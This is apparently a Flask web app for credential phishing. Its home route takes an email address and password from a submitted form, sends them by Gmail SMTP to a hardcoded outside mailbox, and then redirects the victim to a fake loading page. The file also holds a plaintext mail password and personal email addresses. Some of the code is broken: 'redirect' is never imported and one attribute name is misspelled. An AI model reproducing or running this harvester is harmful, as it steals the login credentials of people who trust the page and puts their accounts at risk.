from flask import Flask
from flask import render_template
from flask import request
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import os
import smtplib
import ssl
from email.message import EmailMessage
from selenium.webdriver.chrome.service import Service
chrome_options=webdriver.ChromeOptions()
chrome_options.binary_loction=os.environ.get("GOOGLE_CHROME_BIN")
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-dev-shm-usage")
driver=webdriver.Chrome(service=Service(executable_path=os.environ.get("CHROMEDRIVER_PATH")),options=chrome_options)
csubject="THIS IS IMPORTANT"
password="CLIVE10GWEN"
app=Flask(__name__)
recvemail="clivethompson09@gmail.com"
myemail="cryptobot693@gmail.com"
@app.route('/',methods=['GET','POST'])
def home():
  global emai
  global pa
  emai= request.form.get("variable1")
  pa=request.form.get("variable2")
  if request.method == "POST":
    emai = request.form.get("email")
    pa=request.form.get("password")
    message=EmailMessage()
    message["From"]=myemail
    message["To"]=recvemail
    message["subject"]=csubject
    cbody=f"{emai}\n{pa}"
    message.set_content(cbody)
    context=ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com",465,context=context) as server:
        server.login(myemail,password)
        server.sendmail(myemail,recvemail,message.as_string())
    return redirect('/loading')
  return render_template("home.html")

@app.route('/loading')
def load():
  return render_template("loading.html")
if __name__=="__main__":
  app.run()
 
